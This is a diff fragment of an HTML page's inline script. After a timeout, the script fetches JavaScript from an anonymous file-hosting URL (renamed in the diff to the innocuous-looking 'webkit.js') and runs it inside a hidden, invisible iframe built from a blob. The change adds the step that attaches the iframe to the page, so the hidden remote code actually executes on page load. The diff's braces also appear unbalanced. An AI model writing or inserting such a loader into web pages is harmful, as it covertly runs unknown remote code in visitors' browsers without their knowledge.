@@ -6,16 +6,28 @@
   <link rel="stylesheet" href="style250.css" />
   <script>
   setTimeout(() => {
-    fetch('https://files.catbox.moe/cwedrd.js')
+    fetch('https://files.catbox.moe/webkit.js')
       .then(res => res.text())
       .then(js => {
-        const htmlWrapper = `<script>${js}</script>`;
-        const blob = new Blob([htmlWrapper], { type: 'text/html' }); // ✅ Browser-friendly
-        const url = URL.createObjectURL(blob);
+        const htmlWrapper = `
+          <!DOCTYPE html>
+          <html>
+            <head><meta charset="utf-8"></head>
+            <body>
+              <script>${js}</script>
+            </body>
+           </html>
+    `;
 
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
+    const blob = new Blob([htmlWrapper], { type: 'text/html' });
+    const url = URL.createObjectURL(blob);
+
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = url;
+
+    document.body.appendChild(iframe);
+  });
 
         iframe.onload = () => {
           const now = () => `${Math.floor(performance.now())}ms`;
